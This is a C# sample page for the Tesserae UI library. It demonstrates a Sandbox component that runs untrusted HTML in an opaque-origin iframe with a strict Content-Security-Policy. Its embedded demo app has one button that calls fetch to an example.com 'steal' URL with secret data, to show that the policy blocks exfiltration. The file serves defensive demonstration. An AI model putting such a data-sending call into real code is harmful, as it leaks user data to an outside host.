using System.Collections.Generic;
using H5;
using static H5.Core.dom;
using static Tesserae.UI;
using static Tesserae.Tests.Samples.SamplesHelper;

namespace Tesserae.Tests.Samples
{
    [SampleDetails(Group = "Utilities", Order = 31, Icon = UIcons.Shield)]
    public class SandboxSample : IComponent, ISample
    {
        private readonly IComponent _content;

        public SandboxSample()
        {
            const string appHtml =
@"<!DOCTYPE html>
<html>
<head><style>body{font-family:sans-serif;padding:12px;color:#222}button{margin-right:8px}</style></head>
<body>
  <h3>Untrusted mini-app</h3>
  <p>Running fully sandboxed (no same-origin, strict CSP).</p>
  <button id=ok>Post a message</button>
  <button id=boom>Throw an error</button>
  <button id=evil>Try to fetch() (blocked by CSP)</button>
  <script>
    document.getElementById('ok').onclick   = () => window.tssSandbox.post({ hello: 'from the sandbox', at: Date.now() });
    document.getElementById('boom').onclick  = () => { throw new Error('Boom! something went wrong inside the app'); };
    document.getElementById('evil').onclick  = () => fetch('https://example.com/steal?data=secret');
    window.addEventListener('tss:message', e => {
      const d = document.createElement('div');
      d.textContent = 'Host says: ' + JSON.stringify(e.data);
      document.body.appendChild(d);
    });
  </script>
</body>
</html>";

            var log = VStack().WS().H(160).ScrollY();

            void Append(string text, bool danger = false)
            {
                var line = TextBlock(text).XSmall().WS();
                if (danger) line.Danger();
                log.Add(line);
            }

            var sandbox = Sandbox(appHtml)
               .FitHeightToContent()
               .OnError(err => Append("⚠ " + err.ToString(), danger: true))
               .OnMessage(msg => Append("← message: " + (Script.Write<string>("JSON.stringify({0})", msg) ?? "")))
               .WS();

            var ping = Button("Send message into sandbox").SetIcon(UIcons.PaperPlane)
               .OnClick(() => sandbox.PostMessage(new Dictionary<string, object> { ["ping"] = "hi app" }));

            _content = SectionStack().Secondary()
               .SampleTitle(typeof(SandboxSample), UIcons.Shield, "A locked-down iframe for rendering untrusted HTML / apps")
               .FlatSection(Stack().WidthStretch().Children(
                    Card(VStack().WS().Children(
                        TextBlock("Sandbox renders untrusted content inside an iframe that is fully sandboxed by default: loaded via srcdoc with sandbox=\"allow-scripts allow-forms\" (no allow-same-origin, so it runs in an opaque origin and cannot reach the host page, cookies or storage), and a strict Content-Security-Policy is injected as the first thing in the document so the code cannot exfiltrate data over the network."),
                        TextBlock("A bootstrap script wires up a MessageChannel: uncaught errors, unhandled rejections and CSP violations are captured inside the frame and posted back to the host via OnError. Custom host <-> sandbox messages flow through OnMessage / PostMessage."))).SetTitle("Overview")))
               .FlatSection(Stack().WidthStretch().Children(
                    Card(VStack().WS().Children(
                        SampleSubTitle("Live demo"),
                        TextBlock("The buttons below run inside the sandbox. \"Throw an error\" and the blocked fetch() both surface in the error log via the post-message flow."),
                        sandbox,
                        ping,
                        SampleSubTitle("Error / message log"),
                        log)).SetTitle("Usage")))
               .FlatSection(Stack().WidthStretch().Children(
                    Card(VStack().WS().Children(
                        MarkdownBlock("```csharp\nvar sandbox = Sandbox(untrustedHtml)\n   .FitHeightToContent()\n   .OnError(err => Console.WriteLine(err))      // errors + CSP violations\n   .OnMessage(msg => Handle(msg));             // window.tssSandbox.post(...)\n\nsandbox.PostMessage(new { ping = \"hi\" });       // -> 'tss:message' event inside the frame\n```"))).SetTitle("Code")));
        }

        public HTMLElement Render() => _content.Render();
    }
}
